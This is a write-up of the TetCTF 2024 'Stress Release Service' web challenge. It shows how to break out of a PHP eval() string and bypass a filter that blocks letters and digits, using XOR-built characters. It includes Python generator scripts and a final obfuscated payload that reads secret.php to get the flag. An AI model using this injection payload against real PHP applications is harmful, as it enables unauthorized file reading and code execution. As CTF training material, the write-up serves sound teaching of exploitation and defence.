
The challenge presented in this write-up originates from the TetCTF (Capture the Flag) cybersecurity competition held in 2024. Specifically, it pertains to a challenge titled “Stress Release Service” included in said CTF event. Let’s start by seeing the challenge description:

![Challenge description](https://miro.medium.com/v2/resize:fit:734/1*R8F-d5NNkFE-aFVF442k1Q.png)

Well, an initial review of the descriptive text does not reveal overt clues to approaching or solving it. Proceeding with the analysis, the next logical step is to examine the webpage associated with the challenge, as well as the accompanying source code that has been provided.

![](https://miro.medium.com/v2/resize:fit:875/1*VKfJnVnTeCcr6LNkl6vuDQ.png)

Just a simple webpage, nothing but a textbox with a shout button.

Proceeding with evaluation of the accompanying source code, we find two PHP scripts —  _index.php_  and  _secret.php_. _secret.php_ contains the flag in a variable and thus it isn’t directly accessible. Thus we need a way to read  _secret.php_  from  _index.php_

![](https://miro.medium.com/v2/resize:fit:875/1*Z5fLlaq3q6pwVBIQKZ83TQ.png)

Moving on to  _index.php_  .. there is something special.

![](https://miro.medium.com/v2/resize:fit:875/1*RFddMZ43kHcA_vXgZflFUA.png)

The source code reveals that text entered into the “shout” input field is passed to a PHP eval() function after first undergoing validation checks. In essence, the application dynamically evaluates unsafe PHP code pieced together like so:

$res='some_garbage_text_here $voice some_more_garbage';

where  `$voice`  is controlled by us.

First let’s take a glance at the validations and restrictions that we have:

![](https://miro.medium.com/v2/resize:fit:875/1*zCO7b723EryQ4zjGqJl1Cg.png)

So we can’t have any alphabets or numbers. Moreover, we can only have at most 7 distinct characters. At first glance this appears to significantly restrict the exploitability of the eval() vulnerability. However, tools exist which facilitate crafting obfuscated PHP payloads while conforming to such character restrictions — for example, PhpFk ([https://b-viguier.github.io/PhpFk/](https://b-viguier.github.io/PhpFk/)) , PHPFun ([https://lebr0nli.github.io/PHPFun/](https://lebr0nli.github.io/PHPFun/)), and PHPFuck ([https://splitline.github.io/PHPFuck)/](https://splitline.github.io/PHPFuck/). These applications can encode functional PHP scripts using a very limited set of non-alpha-numeric characters.

What other limitations do we have?

![](https://miro.medium.com/v2/resize:fit:875/1*OWdJ48lRLGOSv5BX6JX78w.png)

Total length of the payload (actucally the  `res`variable) including the garbage should be less than 300? Nah. it’s just a scam, this check is happening after the eval which makes no sense (you can just print from inside the eval).

Alright, we’re ready to start putting together the payload to hack this thing. I’ll build it step-by-step assuming you’re not familiar with obfuscated PHP code. That way you can follow along even if you don’t have much experience messing with this crazy looking “brainfucked” PHP. The basic idea is that we can scramble PHP in a way that it still works fine, but looks totally wild and confusing at first glance.

Alright, first things first — let’s not worry about the rules on what characters we can use yet. We’ll deal with that later. For now, we’ve got a place in the code where what we type into that shout box gets evaluated as actual PHP code. So in basic terms, the following PHP code is evaluated.

$res='some_garbage_text_here $voice some_more_garbage';

Now, we need to escape the single quotes, otherwise whatever we write will just be assigned as a string to the $res variable. Then I will be using  `readfile`  function to read  _secret.php_ directly into the output stream. Thus,

$voice = "'.readfile('secret.php').'"

will result into

$res = 'some_garbage_text_here '.readfile('secret.php').' some_more_garbage';

which will display the file  _secret.php_  along with the flag. But alphanumeric characters are not allowed!

PHPFuck and PHPFun work only on PHP 7 but here we have PHP 8.3 so they both are out of question.

PhpF**k got me scared by the size of their  _hello world_ program  [https://b-viguier.github.io/PhpFk/hello_world_6.html](https://b-viguier.github.io/PhpFk/hello_world_6.html)

So the script kiddie inside me stopped and thought that now it’s time for some manual work!

Okay, so you might be wondering — how can we actually run  `readfile`  if we can’t use the normal function syntax (since alpha numerics are blocked)? Excellent question!

Here’s the cool PHP trick: you can execute a function by calling it as a string, like this — `'function_name'()`. See what I did there? By surrounding the name in quotes and adding parentheses, it basically tells PHP “hey, treat this string as a function and run it!” Pretty nifty, right?

So for us, all we need to do is use that technique:  `'readfile'('secret.php')`

Adding the single quote escaping, final payload will be  `'.'readfile'('secret.php').'`

Now, we just need to get these 2 strings ‘readfile’ and ‘secret.php’. Let’s generate some characters and concatenate them!

So it is all about generating different characters and I will be using XOR (^) operation for that. Currently, we are using  `'`to escape and inject,  `(`and  `)`for function calls,  `.`for concatenation and  `^`for XORing. These are 5 characters, we can still have 2 more. I will be using  `\`and  `;`. I bet this can probably be done in 6 characters.

I have made a simple python script which enumerates all the characters that we can make by only XOR operation.
```
avail = """.()'^;\\"""  
  
got = {}  
  
for i in range(1, 7):  
    for comb in itertools.combinations(avail, i):  
        ans = 0  
        for x in comb:  
            ans = ans ^ ord(x)  
          
        if chr(ans) in string.printable:  
            got[chr(ans)] = comb  
  
  
for p in got:  
    print(p, got[p])
```
```
p ('.', '^')  
r ('.', '\\')  
v ('(', '^')  
t ('(', '\\')  
w (')', '^')  
u (')', '\\')  
y ("'", '^')  
{ ("'", '\\')  
e ('^', ';')  
g (';', '\\') 
...  
O ('(', ';', '\\')  
P (')', "'", '^')  
5 (')', "'", ';')  
R (')', "'", '\\')  
L (')', '^', ';')  
...
```
It’s the trimmed output it gives, which means you can get the character  `p`by XORing  `.`and  `^`  .. similarly you can get  `R`  by XORing  `)`  ,  `'`  and  `\`

We will now just replace each of the term here by their character representation and concatenate them
```Python
def generate(s: str):  
    ans = ""  
    for x in s:  
        if x in got:  
            f = "("  
            for c in got[x]:  
                if f[-1] != "(":  
                    f += "^"  
                if c == "'":  
                    f += "'\\''"  
                elif c == "\\":  
                    f += "'\\\\'"  
                else:  
                    f += f"'{c}'"  
            f += ")"  
            if len(ans) > 0:  
                ans += "."  
            ans += f  
  
    return ans  
  
payload = f"'.({generate('readfile')})({generate('secret.php')}).'"  
  
print(payload)
```
Thus resulting in the final payload below:

'.(('.'^'\\').('^'^';').('.'^'('^';'^'\\').('('^')'^'^'^';').('('^')'^';'^'\\').(')'^'\''^';'^'\\').('.'^'\''^'^'^';').('^'^';'))(('.'^'('^')'^'\\').('^'^';').('.'^'('^'^'^';').('.'^'\\').('^'^';').('('^'\\').('.').('.'^'^').('('^'\''^';'^'\\').('.'^'^')).'

![](https://miro.medium.com/v2/resize:fit:875/1*RPDVRgdi-3KsJ6K2FDEbLQ.png)

![](https://miro.medium.com/v2/resize:fit:875/1*oro3VJLJyPvppqkQEWGfvQ.png)

Here we have the flag!!